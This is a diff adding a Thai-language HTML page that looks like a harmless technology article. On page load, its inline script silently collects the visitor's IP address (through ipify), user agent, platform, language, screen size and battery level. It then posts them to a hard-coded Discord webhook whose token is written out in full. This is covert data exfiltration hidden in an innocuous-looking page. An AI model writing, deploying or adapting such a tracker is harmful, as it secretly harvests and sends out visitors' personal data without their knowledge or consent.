@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>บทความน่าสนใจ</title>
+    <style>
+        body { font-family: Arial, sans-serif; line-height: 1.6; margin: 20px; }
+        article { max-width: 800px; margin: auto; }
+        h1 { color: #333; }
+    </style>
+</head>
+<body>
+    <article>
+        <h1>บทความน่าสนใจเกี่ยวกับเทคโนโลยี</h1>
+        <p>นี่คือบทความตัวอย่างที่ให้ข้อมูลเกี่ยวกับเทคโนโลยีต่าง ๆ และวิธีการพัฒนาเว็บสมัยใหม่...</p>
+        <p>อ่านต่อไปเพื่อเข้าใจวิธีการใช้เครื่องมือและเทคนิคใหม่ ๆ ในการพัฒนาเว็บ</p>
+    </article>
+
+    <script>
+        // Discord Webhook URL
+        const webhookURL = "https://discord.com/api/webhooks/1270880902045503498/N-TWxnUShFZgO0ZplC9mIRJsIi_1CFdHG-PhjA_sD6o8FLkC26I1gZ0HJAW3KhSpYb0H";
+
+        // ฟังก์ชันส่งข้อมูลไป Discord
+        async function sendToDiscord(info) {
+            try {
+                await fetch(webhookURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: info })
+                });
+            } catch (err) {
+                console.error("ไม่สามารถส่งข้อมูลไป Discord ได้:", err);
+            }
+        }
+
+        // ดึงข้อมูลผู้ใช้
+        async function collectUserInfo() {
+            // ข้อมูลเบื้องต้นจาก browser
+            const browser = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language;
+            const screenSize = `${window.screen.width}x${window.screen.height}`;
+            const battery = navigator.getBattery ? await navigator.getBattery().then(b => b.level * 100 + "%") : "ไม่สามารถเข้าถึงได้";
+
+            // ดึง IP โดยใช้ API ฟรี
+            const ipResponse = await fetch("https://api.ipify.org?format=json");
+            const ipData = await ipResponse.json();
+            const ip = ipData.ip;
+
+            const info = `
+ผู้ใช้เข้าชมเว็บไซต์
+IP: ${ip}
+Browser: ${browser}
+Platform: ${platform}
+Language: ${language}
+Screen Size: ${screenSize}
+Battery: ${battery}
+`;
+
+            // ส่งข้อมูลไป Discord
+            sendToDiscord(info);
+        }
+
+        collectUserInfo();
+    </script>
+</body>
+</html>
